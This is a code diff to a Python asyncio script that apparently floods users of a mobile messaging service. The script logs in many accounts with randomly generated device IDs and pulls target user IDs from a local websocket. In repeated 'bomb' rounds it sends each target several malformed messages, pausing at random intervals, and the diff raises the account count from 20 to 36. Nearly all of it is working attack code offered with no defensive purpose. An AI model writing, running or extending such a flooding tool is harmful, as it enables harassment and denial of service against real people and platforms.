@@ -18,6 +18,7 @@ from lib import make_logon_data, get_proxies, del_proxy, make_send_msg_data, mak
 headers = {
     "User-Agent": "Mozilla/5.0 (Linux; U; Android 9.0.1; en-us;) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1"
 }
+pool = dict()
 # socket.socket = socks.socksocket
 
 def get_proxies2():
@@ -63,6 +64,26 @@ async def heartbeat(writer):
             print(traceback.format_exc())
             break
 
+async def ws_updater():
+    global pool
+    async with aiohttp.ClientSession() as session:
+        while True:
+            try:
+                async with session.ws_connect('http://localhost:7788/ws') as ws:
+                    async for msg in ws:
+                        if msg.type == aiohttp.WSMsgType.TEXT:
+                            if msg.data == 'close cmd':
+                                await ws.close()
+                                break  # won't get here
+                            else:
+                                # print('get data', msg.data)
+                                pool = json.loads(msg.data)
+                        elif msg.type == aiohttp.WSMsgType.ERROR:
+                            raise StandardError(aiohttp.WSMsgType.ERROR)
+            except aiohttp.client_exceptions.ClientConnectorError:
+                print("connection error, wait 5s")
+                await asyncio.sleep(5)
+
 async def read_bytes(reader, length):
     buf = b""
     while len(buf) < length:
@@ -84,6 +105,8 @@ async def one(loop, email, wait=0):
     imei = "".join(str(random.randint(0,9)) for x in range(1, len("863272039030961")+1))
     version = "1.6.61095"
     uid, token, session = None, None, None
+    if wait:
+        await asyncio.sleep(wait)
     while True:
         print("start:", email)
         try:
@@ -104,43 +127,28 @@ async def one(loop, email, wait=0):
             print(r)
             writer.write(b'\x00\x00\x00\x02\x01\x00')
             writer.write(b'\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x07\x00\x01\x00\x00\x00\x00\x07')
-            writer.write(b'\x00\x00\x00\x0e\x01\x01\x9f\x79\x05\x00\xf0\x1c\xf6\xc1\xab\x77\xd1\x41')
             asyncio.ensure_future(heartbeat(writer), loop=loop)
+            asyncio.ensure_future(ws_updater(), loop=loop)
             i = 0
-            print("bomb start------->>>>>>>")
             targets = []
+            bomb_times = 0
             while True:
                 i += 1
-                if i % 5 == 0:
-                    try:
-                        async with aiohttp.ClientSession() as session:
-                            while True:
-                                async with session.get("http://localhost:7788/get_list", timeout=1) as resp:
-                                    r = await resp.json()
-                                if r:
-                                    break
-                                await asyncio.sleep(1)
-
-                        targets = sorted(r.items(), key=lambda x: x[1])
-                        print("targets:", targets)
-                    except:
-                        print(traceback.format_exc())
-                        await asyncio.sleep(3)
-                        continue
-                bomb_list = targets[:12]
-                if len(targets) > 12:
-                    r = targets[12:]
-                    random.shuffle(r)
-                    bomb_list += r[:3]
-                print("bombing list:", bomb_list)
-                for receiver, t in bomb_list:
+                for receiver, t in pool.items():
                     receiver = int(receiver)
                     writer.write(make_bad_msg_data(char_gen()*1, receiver, 4))
                     writer.write(make_bad_msg_data(char_gen()*1, receiver, 5))
                     writer.write(make_bad_msg_data(char_gen()*1, receiver, 6))
                     writer.write(make_bad_msg_data(char_gen()*1, receiver, 7))
                     writer.write(make_bad_msg_data(char_gen()*1, receiver, 8))
-                await writer.drain()
+                if pool:
+                    print(email, "bomb end------->>>>>>>round:", bomb_times)
+                    await writer.drain()
+                    bomb_times += 1
+                    if bomb_times%5 == 0:
+                        await asyncio.sleep(random.randint(15, 20))
+                else:
+                    await asyncio.sleep(1)
         except BrokenPipeError:
             import traceback
             print(traceback.format_exc())
@@ -160,7 +168,7 @@ if __name__ == "__main__":
     conn = sqlite3.connect("data.db")
     conn.isolation_level = None   # auto commit
     c = conn.cursor()
-    c.execute("SELECT * FROM guards WHERE length(name)==3 ORDER BY RANDOM() LIMIT 20")
+    c.execute("SELECT * FROM guards WHERE length(name)==3 ORDER BY RANDOM() LIMIT 36")
     idx = 0
     for row in c.fetchall():
         idx += 1
